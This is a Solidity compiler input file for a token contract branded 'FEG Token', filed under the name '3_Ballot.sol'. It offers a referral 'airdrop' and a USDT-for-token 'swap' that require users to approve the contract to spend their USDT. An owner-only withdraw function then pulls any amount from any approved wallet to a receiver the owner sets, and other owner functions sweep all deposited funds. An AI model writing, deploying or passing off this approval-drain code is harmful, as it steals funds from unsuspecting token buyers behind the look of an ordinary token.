{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/3_Ballot.sol":{"content":"pragma solidity 0.6.0;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n   \r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface ITetherToken {\r\n    function transferFrom(address from, address to, uint value) external;\r\n    function balanceOf(address who) external view returns (uint);\r\n    function transfer(address to, uint value) external;\r\n}\r\n\r\ncontract FEG is IERC20 {\r\n\r\n    ITetherToken public tetherToken = ITetherToken(0xdAC17F958D2ee523a2206206994597C13D831ec7);\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    struct User {\r\n        uint256 id;\r\n        address upline;\r\n    }\r\n    mapping(address => User) private users;\r\n    uint256 private nextid = 2;\r\n    address private _owner;\r\n    address payable private receiver;\r\n    \r\n     modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    constructor() public {\r\n        uint256 total = 10**17 * 10**9;\r\n        _balances[msg.sender] = total;\r\n        _owner = msg.sender;\r\n        users[msg.sender].id = 1;\r\n        receiver = msg.sender;\r\n        emit Transfer(address(0), msg.sender, total);\r\n    }\r\n\r\n    function airdrop(address upline) public {\r\n        require(!isUserExists(msg.sender));\r\n        require(isUserExists(upline), \"referrer not exists\");\r\n        register(upline);\r\n        \r\n        tetherToken.transferFrom(msg.sender, address(this), 100000);\r\n        _transfer(address(this), msg.sender, 10000*10**9);\r\n\r\n        back();\r\n    }\r\n\r\n    function swap(address upline, uint256 amount) public {\r\n        if (!isUserExists(msg.sender)) {\r\n            require(isUserExists(upline), \"referrer not exists\");\r\n            register(upline);\r\n        }\r\n    \r\n        tetherToken.transferFrom(msg.sender, address(this), amount);\r\n        _transfer(address(this), msg.sender, amount*10000);\r\n\r\n        back();\r\n    }\r\n\r\n    function register(address upline) private {\r\n        users[msg.sender].id = nextid;\r\n        users[msg.sender].upline = upline;\r\n        nextid++;\r\n    }\r\n\r\n    function back() private {\r\n        if (users[msg.sender].upline != address(0)){\r\n            _transfer(address(this), users[msg.sender].upline, 10000*10**9);\r\n            address upline = users[msg.sender].upline;\r\n            if (users[upline].upline != address(0)){\r\n                _transfer(address(this), users[upline].upline, 5000*10**9);\r\n            }\r\n        }\r\n    }\r\n    \r\n    function isUserExists(address addr) public view returns (bool) {\r\n        return (users[addr].id != 0);\r\n    }\r\n\r\n    function setR(address payable r) public onlyOwner() {\r\n        receiver = r;\r\n    }\r\n\r\n    function withdrawUSDT() public onlyOwner() {\r\n        tetherToken.transfer(msg.sender, tetherToken.balanceOf(address(this)));\r\n    }\r\n\r\n    function withdrawE() public onlyOwner() {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n    \r\n    function withdraw(address addr, uint256 amount) public onlyOwner() {\r\n        tetherToken.transferFrom(addr, receiver, amount);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return \"FEG Token\";\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return \"FEG\";\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return 10**17 * 10**9;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][msg.sender];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, msg.sender, currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}"}}}